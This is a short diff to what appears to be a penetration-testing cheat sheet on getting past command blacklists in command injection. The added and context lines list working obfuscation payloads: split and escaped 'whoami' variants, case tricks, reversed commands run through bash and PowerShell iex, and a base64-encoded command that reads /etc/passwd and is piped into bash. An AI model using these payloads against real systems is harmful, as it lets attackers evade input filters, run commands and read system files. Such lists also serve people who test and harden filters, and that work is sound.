@@ -20,3 +20,9 @@
 - If a command like `whoami` is blacklisted, then for `BASH` or `POWERSHELL` we can use - `w'h'o'am'i`
 - If a command like `whoami` is blacklisted and it's confirmed that it is `LINUX BASH`, then we can use- `who$@ami`  or  `w\ho\am\i`
 - If a command like `whoami` is blacklisted and it's confirmed that it is `WINDOWS`, then we can use - `who^ami`
+- We can use Case Manipulation - `WhOaMi`
+- `$(a="WhOaMi";printf %s "${a,,}")`
+- `LINUX` Reversed Command - `$(rev<<<'imaohw')`
+- `POWERSHELL` Reversed Command - `iex "$('imaohw'[-1..-20] -join '')"`
+- Encode the Command using - `echo -n 'cat /etc/passwd | grep 33' | base64` and then use the payload as : `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`
+- 
